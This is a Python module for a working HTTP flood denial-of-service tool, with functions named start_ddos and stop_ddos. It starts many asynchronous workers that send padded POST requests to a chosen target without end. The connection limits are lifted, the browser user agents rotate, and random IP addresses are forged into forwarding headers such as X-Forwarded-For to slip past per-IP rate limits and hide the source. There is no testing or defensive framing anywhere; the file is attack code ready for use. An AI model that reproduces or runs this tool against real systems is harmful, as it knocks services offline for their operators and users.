import asyncio
import aiohttp
import random

_is_running = False
_total_requests = 0
_tasks = []
_monitor_task = None

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
]


async def _worker(worker_id, target, kb_size, on_update):
    global _is_running, _total_requests
    try:
        payload_kb = int(kb_size) if kb_size else 10
        if payload_kb > 99: payload_kb = 99
        if payload_kb <= 0: payload_kb = 1
        data = b"A" * (1024 * payload_kb)
    except:
        data = b"A" * 10240

    connector = aiohttp.TCPConnector(
        limit=0, limit_per_host=0, force_close=True,
        enable_cleanup_closed=True, ttl_dns_cache=0,
        use_dns_cache=False, ssl=False
    )
    session = aiohttp.ClientSession(connector=connector)

    try:
        while _is_running:
            try:
                fake_ip = f"{random.choice([5, 31, 37, 77, 80, 81, 82, 85, 87, 88, 89, 91, 93, 94, 95, 109, 147, 158, 176, 178, 185, 188, 193, 194, 212, 213, 217])}.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(0,254)}"
                headers = {
                    "User-Agent": random.choice(USER_AGENTS),
                    "X-Real-IP": fake_ip,
                    "X-Forwarded-For": fake_ip,
                    "X-Forwarded-Host": fake_ip,
                    "X-Client-IP": fake_ip,
                    "X-Remote-IP": fake_ip,
                    "X-Remote-Addr": fake_ip,
                    "Originating-IP": fake_ip,
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Accept": "*/*",
                    "Accept-Language": "en-US,en;q=0.9",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Connection": "keep-alive",
                    "Cache-Control": "no-cache",
                    "Pragma": "no-cache",
                }
                async with session.post(target, data=data, headers=headers, timeout=10) as resp:
                    status = resp.status
                    await resp.read()
                _total_requests += 1
                on_update(_total_requests, fake_ip, status)
            except asyncio.CancelledError:
                break
            except Exception:
                _total_requests += 1
                on_update(_total_requests, fake_ip, None)
            await asyncio.sleep(0)
    finally:
        await session.close()

async def _monitor(on_stats):
    global _is_running
    last_count = 0
    start_time = asyncio.get_event_loop().time()
    while _is_running:
        await asyncio.sleep(1)
        current = _total_requests
        elapsed = asyncio.get_event_loop().time() - start_time
        rps = current - last_count
        on_stats(int(elapsed), rps, current)
        last_count = current

async def start_ddos(target, kb_size, workers, on_update, on_stats):
    global _is_running, _total_requests, _tasks, _monitor_task
    stop_ddos()
    _is_running = True
    _total_requests = 0
    _tasks.clear()
    for i in range(workers):
        task = asyncio.create_task(_worker(i, target, kb_size, on_update))
        _tasks.append(task)
    _monitor_task = asyncio.create_task(_monitor(on_stats))

def stop_ddos():
    global _is_running, _tasks, _monitor_task
    if _is_running:
        _is_running = False
        for task in _tasks:
            if not task.done():
                task.cancel()
        if _monitor_task and not _monitor_task.done():
            _monitor_task.cancel()
        _tasks.clear()
        _monitor_task = None

def is_ddos_running():
    return _is_running

def get_total_requests():
    return _total_requests
